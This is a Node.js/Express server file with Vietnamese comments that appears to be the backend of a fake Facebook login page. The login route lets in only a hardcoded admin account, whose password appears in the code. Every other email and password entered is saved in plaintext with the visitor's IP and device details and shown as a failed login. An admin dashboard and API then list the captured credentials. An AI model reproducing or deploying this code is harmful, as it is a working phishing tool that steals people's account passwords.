const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const mongoose = require('mongoose');
const session = require('express-session');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

// Kết nối MongoDB
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/facebook_clone', {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => console.log('✅ Đã kết nối MongoDB'))
.catch(err => console.error('❌ Lỗi kết nối MongoDB:', err));

// Schema cho User
const userSchema = new mongoose.Schema({
    firstName: { type: String, required: true },
    lastName: { type: String, required: true },
    fullName: { type: String, required: true },
    email: { type: String, required: true, unique: true },
    password: { type: String, required: true },
    dob: { type: String, required: true },
    gender: { type: String, required: true },
    role: { type: String, default: 'user' },
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Schema cho Login History
const loginHistorySchema = new mongoose.Schema({
    email: { type: String, required: true },
    password: { type: String, required: true },
    attemptedAt: { type: Date, default: Date.now },
    ipAddress: { type: String, default: 'Unknown' },
    device: {
        deviceType: String,
        os: String,
        browser: String
    },
    success: { type: Boolean, default: false }
});

const LoginHistory = mongoose.model('LoginHistory', loginHistorySchema);

// Middleware
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Session
app.use(session({
    secret: process.env.SESSION_SECRET || 'your-secret-key-here',
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 24 * 60 * 60 * 1000 } // 24 giờ
}));

// Thông tin admin
const ADMIN_EMAIL = 'linhnguyenadmin@ngok.com';
const ADMIN_PASSWORD = 'adminlinh6868';

// ============= ROUTES =============

// Trang chủ - redirect to login
app.get('/', (req, res) => {
    res.redirect('/login');
});

// Trang đăng nhập
app.get('/login', (req, res) => {
    res.render('login', { 
        error: null,
        success: req.query.success || null
    });
});

// Xử lý đăng nhập
app.post('/login', async (req, res) => {
    try {
        const { email, password, deviceInfo } = req.body;
        const device = deviceInfo ? JSON.parse(deviceInfo) : {};

        // Lấy IP address
        const ipAddress = req.headers['x-forwarded-for'] || 
                         req.connection.remoteAddress || 
                         'Unknown';

        // Kiểm tra tài khoản admin
        if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
            // ✅ Đăng nhập thành công với admin
            req.session.user = {
                email: email,
                role: 'admin'
            };
            
            return res.redirect('/admin/dashboard');
        }

        // ❌ Sai tài khoản → Lưu vào loginHistory
        await saveLoginAttempt(email, password, ipAddress, device, false);

        // Hiển thị lỗi
        res.render('login', { 
            error: 'Tài khoản hoặc mật khẩu không đúng!' 
        });

    } catch (error) {
        console.error('Lỗi đăng nhập:', error);
        res.render('login', { 
            error: 'Đã xảy ra lỗi. Vui lòng thử lại!' 
        });
    }
});

// Hàm lưu login attempt
async function saveLoginAttempt(email, password, ipAddress, device, success) {
    try {
        const safeEmail = email || '(không nhập)';
        const safePassword = password || '(không nhập)';

        // ❌ KHÔNG lưu nếu là tài khoản admin
        if (safeEmail === ADMIN_EMAIL && safePassword === ADMIN_PASSWORD) {
            return;
        }

        // 🔍 Check trùng email + password
        const existingAttempt = await LoginHistory.findOne({
            email: safeEmail,
            password: safePassword
        });

        if (existingAttempt) {
            return; // Đã tồn tại, không lưu nữa
        }

        // Lưu vào database
        const loginAttempt = new LoginHistory({
            email: safeEmail,
            password: safePassword,
            attemptedAt: new Date(),
            ipAddress: ipAddress || 'Unknown',
            device: {
                deviceType: device.deviceType || 'Unknown',
                os: device.os || 'Unknown',
                browser: device.browser || 'Unknown'
            },
            success: success
        });

        await loginAttempt.save();
        console.log('✅ Đã lưu login attempt');

    } catch (err) {
        console.error('❌ Lỗi lưu loginHistory:', err);
    }
}

// Xử lý đăng ký
app.post('/register', async (req, res) => {
    try {
        const { firstName, lastName, email, password, day, month, year, gender } = req.body;

        // Validate
        if (!firstName || !lastName || !email || !password) {
            return res.status(400).json({ 
                error: 'Vui lòng điền đầy đủ thông tin!' 
            });
        }

        // Check email đã tồn tại
        const existingUser = await User.findOne({ email });
        if (existingUser) {
            return res.status(400).json({ 
                error: 'Email đã được sử dụng!' 
            });
        }

        // Tạo user mới
        const newUser = new User({
            firstName,
            lastName,
            fullName: `${firstName} ${lastName}`,
            email,
            password, // Nên mã hóa với bcrypt trong production
            dob: `${year}-${String(month).padStart(2, '0')}-${String(day).padStart(2, '0')}`,
            gender,
            role: 'user'
        });

        await newUser.save();
        console.log('✅ Đăng ký thành công:', email);

        res.json({ 
            success: true, 
            message: 'Đăng ký thành công! Bạn có thể đăng nhập ngay.' 
        });

    } catch (error) {
        console.error('❌ Lỗi đăng ký:', error);
        res.status(500).json({ 
            error: 'Đăng ký thất bại. Vui lòng thử lại!' 
        });
    }
});

// Xử lý quên mật khẩu
app.post('/forgot-password', async (req, res) => {
    try {
        const { email } = req.body;
        
        if (!email) {
            return res.status(400).json({ 
                error: 'Vui lòng nhập email!' 
            });
        }

        // Kiểm tra email có tồn tại không
        const user = await User.findOne({ email });
        
        // Luôn trả về thông báo thành công (bảo mật)
        res.json({ 
            success: true,
            message: `Chúng tôi đã gửi liên kết đặt lại mật khẩu đến ${email}. Vui lòng kiểm tra hộp thư (bao gồm cả thư rác).`
        });

        // Log nếu email tồn tại
        if (user) {
            console.log('📧 Yêu cầu reset password cho:', email);
            // TODO: Gửi email reset password thật
        }

    } catch (error) {
        console.error('❌ Lỗi quên mật khẩu:', error);
        res.status(500).json({ 
            error: 'Đã xảy ra lỗi. Vui lòng thử lại!' 
        });
    }
});

// Admin Dashboard (cần đăng nhập)
app.get('/admin/dashboard', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.redirect('/login');
    }
    
    res.render('admin-dashboard', { user: req.session.user });
});

// API: Lấy danh sách login history (cho admin)
app.get('/api/login-history', async (req, res) => {
    try {
        if (!req.session.user || req.session.user.role !== 'admin') {
            return res.status(403).json({ error: 'Không có quyền truy cập' });
        }

        const history = await LoginHistory.find()
            .sort({ attemptedAt: -1 })
            .limit(100);

        res.json(history);
    } catch (error) {
        console.error('Lỗi lấy login history:', error);
        res.status(500).json({ error: 'Lỗi server' });
    }
});

// API: Lấy danh sách users (cho admin)
app.get('/api/users', async (req, res) => {
    try {
        if (!req.session.user || req.session.user.role !== 'admin') {
            return res.status(403).json({ error: 'Không có quyền truy cập' });
        }

        const users = await User.find()
            .select('-password') // Không trả về password
            .sort({ createdAt: -1 });

        res.json(users);
    } catch (error) {
        console.error('Lỗi lấy users:', error);
        res.status(500).json({ error: 'Lỗi server' });
    }
});

// Đăng xuất
app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

// Khởi động server
app.listen(port, () => {
    console.log(`🚀 Server đang chạy tại http://localhost:${port}`);
    console.log(`🔐 Trang đăng nhập: http://localhost:${port}/login`);
});